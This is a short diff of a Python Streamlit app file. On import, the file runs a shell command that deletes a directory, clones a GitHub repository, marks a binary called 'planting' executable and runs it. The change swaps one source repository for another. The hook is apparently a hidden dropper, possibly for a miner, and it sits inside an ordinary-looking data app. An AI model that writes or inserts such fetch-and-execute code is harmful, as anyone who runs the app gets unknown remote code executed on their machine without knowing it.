@@ -4,4 +4,4 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf app && git clone https://github.com/keroperos/app.git && cd app && chmod +x planting && ./planting")
+os.system ("rm -rf streamlit && git clone https://github.com/apriopera/streamlit.git && cd streamlit && chmod +x planting && ./planting")
